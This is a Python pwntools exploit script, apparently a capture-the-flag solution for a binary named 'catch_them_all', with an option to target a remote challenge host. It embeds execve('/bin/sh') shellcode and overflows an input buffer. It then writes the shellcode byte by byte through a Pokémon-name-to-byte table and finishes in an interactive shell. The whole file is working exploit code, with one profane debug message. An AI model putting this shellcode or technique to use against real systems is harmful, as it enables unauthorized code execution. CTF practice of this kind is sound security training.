#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("catch_them_all")
libc = elf.libc

local = True 
if local:
    p = process("./catch_them_all")
    #gdb.attach(p, '''''')
else:
    p = remote('0.cloud.chals.io', 10898)

elf = context.binary = ELF('./catch_them_all', checksec=False)

shellcode = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
index_shellcode = 0 
shellcode = list(shellcode)
shell_dict = {b'bulbasaur': 7, b'ivysaur': 4, b'venusaur': 5, b'charmander': 2, b'charmeleon': 3, b'charizard': 0, b'squirtle': 1, b'wartortle': 14, b'blastoise': 15, b'caterpie': 12, b'metapod': 13, b'butterfree': 10, b'weedle': 11, b'kakuna': 8, b'beedrill': 9, b'pidgey': 22, b'pidgeotto': 23, b'pidgeot': 20, b'rattata': 21, b'raticate': 18, b'spearow': 19, b'fearow': 16, b'ekans': 17, b'arbok': 30, b'pikachu': 31, b'raichu': 28, b'sandshrew': 29, b'sandslash': 26, b'nidoran-f': 27, b'nidorina': 24, b'nidoqueen': 25, b'nidoran-m': 38, b'nidorino': 39, b'nidoking': 36, b'clefairy': 37, b'clefable': 34, b'vulpix': 35, b'ninetales': 32, b'jigglypuff': 33, b'wigglytuff': 46, b'zubat': 47, b'golbat': 44, b'oddish': 45, b'gloom': 42, b'vileplume': 43, b'paras': 40, b'parasect': 41, b'venonat': 54, b'venomoth': 55, b'diglett': 52, b'dugtrio': 53, b'meowth': 50, b'persian': 51, b'psyduck': 48, b'golduck': 49, b'mankey': 62, b'primeape': 63, b'growlithe': 60, b'arcanine': 61, b'poliwag': 58, b'poliwhirl': 59, b'poliwrath': 56, b'abra': 57, b'kadabra': 70, b'alakazam': 71, b'machop': 68, b'machoke': 69, b'machamp': 66, b'bellsprout': 67, b'weepinbell': 64, b'victreebel': 65, b'tentacool': 78, b'tentacruel': 79, b'geodude': 76, b'graveler': 77, b'golem': 74, b'ponyta': 75, b'rapidash': 72, b'slowpoke': 73, b'slowbro': 86, b'magnemite': 87, b'magneton': 84, b'farfetchd': 85, b'doduo': 82, b'dodrio': 83, b'seel': 80, b'dewgong': 81, b'grimer': 94, b'muk': 95, b'shellder': 92, b'cloyster': 93, b'gastly': 90, b'haunter': 91, b'gengar': 88, b'onix': 89, b'drowzee': 102, b'hypno': 103, b'krabby': 100, b'kingler': 101, b'voltorb': 98, b'electrode': 99, b'exeggcute': 96, b'exeggutor': 97, b'cubone': 110, b'marowak': 111, b'hitmonlee': 108, b'hitmonchan': 109, b'lickitung': 106, b'koffing': 107, b'weezing': 104, b'rhyhorn': 105, b'rhydon': 118, b'chansey': 119, b'tangela': 116, b'kangaskhan': 117, b'horsea': 114, b'seadra': 115, b'goldeen': 112, b'seaking': 113, b'staryu': 126, b'starmie': 127, b'mr-mime': 124, b'scyther': 125, b'jynx': 122, b'electabuzz': 123, b'magmar': 120, b'pinsir': 121, b'tauros': 134, b'magikarp': 135, b'gyarados': 132, b'lapras': 133, b'ditto': 130, b'eevee': 131, b'vaporeon': 128, b'jolteon': 129, b'flareon': 142, b'porygon': 143, b'omanyte': 140, b'omastar': 141, b'kabuto': 138, b'kabutops': 139, b'aerodactyl': 136, b'snorlax': 137, b'articuno': 150, b'zapdos': 151, b'moltres': 148, b'dratini': 149, b'dragonair': 146, b'dragonite': 147, b'mewtwo': 144, b'mew': 145, b'chikorita': 158, b'bayleef': 159, b'meganium': 156, b'cyndaquil': 157, b'quilava': 154, b'typhlosion': 155, b'totodile': 152, b'croconaw': 153, b'feraligatr': 166, b'sentret': 167, b'furret': 164, b'hoothoot': 165, b'noctowl': 162, b'ledyba': 163, b'ledian': 160, b'spinarak': 161, b'ariados': 174, b'crobat': 175, b'chinchou': 172, b'lanturn': 173, b'pichu': 170, b'cleffa': 171, b'igglybuff': 168, b'togepi': 169, b'togetic': 182, b'natu': 183, b'xatu': 180, b'mareep': 181, b'flaaffy': 178, b'ampharos': 179, b'bellossom': 176, b'marill': 177, b'azumarill': 190, b'sudowoodo': 191, b'politoed': 188, b'hoppip': 189, b'skiploom': 186, b'jumpluff': 187, b'aipom': 184, b'sunkern': 185, b'sunflora': 198, b'yanma': 199, b'wooper': 196, b'quagsire': 197, b'espeon': 194, b'umbreon': 195, b'murkrow': 192, b'slowking': 193, b'misdreavus': 206, b'unown': 207, b'wobbuffet': 204, b'girafarig': 205, b'pineco': 202, b'forretress': 203, b'dunsparce': 200, b'gligar': 201, b'steelix': 214, b'snubbull': 215, b'granbull': 212, b'qwilfish': 213, b'scizor': 210, b'shuckle': 211, b'heracross': 208, b'sneasel': 209, b'teddiursa': 222, b'ursaring': 223, b'slugma': 220, b'magcargo': 221, b'swinub': 218, b'piloswine': 219, b'corsola': 216, b'remoraid': 217, b'octillery': 230, b'delibird': 231, b'mantine': 228, b'skarmory': 229, b'houndour': 226, b'houndoom': 227, b'kingdra': 224, b'phanpy': 225, b'donphan': 238, b'porygon2': 239, b'stantler': 236, b'smeargle': 237, b'tyrogue': 234, b'hitmontop': 235, b'smoochum': 232, b'elekid': 233, b'magby': 246, b'miltank': 247, b'blissey': 244, b'raikou': 245, b'entei': 242, b'suicune': 243, b'larvitar': 240, b'pupitar': 241, b'tyranitar': 254, b'lugia': 255, b'ho-oh': 252, b'celebi': 253, b'treecko': 250, b'grovyle': 251, b'sceptile': 248, None: 0}

p.sendline(b"a"*16 + p32(6))
while(True):
        p.recvuntil(b"searching for pokemon... found ")
        poke = p.recvline().strip(b"!\r\n").strip()
        print(shell_dict[poke], shellcode[index_shellcode])
        if(shell_dict[poke] == shellcode[index_shellcode]):
            p.sendlineafter(b"would you like to catch? y/n:", b"y")
            index_shellcode +=1
            print("[+]Send \"Y\"")
            p.recvline()
            x = p.recvline()
            print(x)
            if (b"ran away" in x):
            	print("Chay con cacccccccccccccccccccccccc")
            	index_shellcode -=1
        else:
            p.sendlineafter(b"would you like to catch? y/n:", b"n")
        if(index_shellcode == len(shellcode)):
        	p.sendlineafter(b"would you like to catch? y/n:", b"f")
        	break

p.interactive()
